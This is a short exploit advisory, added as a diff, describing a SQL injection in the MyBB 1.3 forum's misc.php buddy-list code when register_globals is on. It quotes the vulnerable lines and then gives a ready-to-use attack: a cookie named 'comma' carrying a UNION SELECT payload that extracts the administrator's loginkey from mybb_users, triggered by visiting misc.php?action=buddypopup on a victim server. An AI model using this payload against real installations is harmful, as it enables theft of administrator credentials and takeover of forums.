@@ -1,0 +1,56 @@
+MyBB New SQL Injection
+
+D3vil-0x1 < Devil-00 >
+
+Milw0rm ID :-
+http://www.milw0rm.com/auth.php?id=1320
+
+The Inf.File :-
+misc.php
+
+Linez :-
+
+[code]
+	$buddies = $mybb->user['buddylist'];
+
+	$namesarray = explode(",",$buddies);
+
+	if(is_array($namesarray))
+
+	{
+
+		while(list($key, $buddyid) = each($namesarray))
+
+		{
+
+			$sql .= "$comma'$buddyid'"; <== HERE :) Uncleard Var !!
+
+			$comma = ",";
+
+		}
+
+	$timecut = time() - $mybb->settings['wolcutoff'];
+
+	$query = $db->query("SELECT u.*, g.canusepms FROM ".TABLE_PREFIX."users u LEFT JOIN ".TABLE_PREFIX."usergroups g ON (g.gid=u.usergroup) WHERE u.uid IN ($sql)");
+[/code]
+
+From 255 to 265
+
+The GLOBALS unset function .. do not unset $_COOKIES ..
+then u can start attacking any var by cookies :)
+
+Tested MyBB 1.3 .. Register_Globals = On
+
+Explorer Exploit :-
+
+1- Login by any username ..
+2- Create new cookie (
+	name 	=> "comma"
+	value	=> "comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=1/*")
+
+3- Check The URL :-
+HOST/PATH/misc.php?action=buddypopup
+
+Where HOST = The Vic.Server And PATH = MyBB Dir.
+
+# milw0rm.com [2006-02-28]
